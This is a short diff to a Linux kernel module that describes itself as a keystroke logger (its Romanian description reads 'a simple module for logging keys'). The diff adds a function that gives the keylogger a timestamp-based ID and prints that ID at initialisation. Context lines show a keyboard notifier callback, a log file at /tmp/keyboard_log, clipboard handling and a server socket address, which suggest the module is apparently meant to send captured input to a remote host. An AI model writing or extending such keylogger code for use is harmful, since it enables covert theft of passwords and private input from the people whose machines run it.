@@ -2,6 +2,7 @@
 #include "keyboard_callback.h"
 #include "write_to_file.h"
 #include "clipboard.h"
+#include <linux/ktime.h>
 
 #define LOG_FILE_PATH "/tmp/keyboard_log"
 
@@ -9,6 +10,11 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Raluca+Bogdan");
 MODULE_DESCRIPTION("Un simplu modul pentru logarea tastelor");
 MODULE_VERSION("0.1");
+
+static int generate_unique_id(void) {
+    u64 timestamp = ktime_get_real_ns(); // Timpul curent în nanosecunde
+    return (int)(timestamp & 0xFFFFFFFF); // Returnează doar o parte (32 biți)
+}
 
 static struct KEYLOGGER *keylogger;
 struct sockaddr_in server_addr;
@@ -24,6 +30,9 @@ static int __init keyboard_logger_init(void)
         return -ENOMEM;
     }
     //mutex_init(&(clipboard->lock));
+
+    keylogger->id = generate_unique_id();
+    pr_info("Keylogger initialized with ID: %d\n", keylogger->id);
 
     keylogger->key_notifier.notifier_call=keyboard_callback;
     
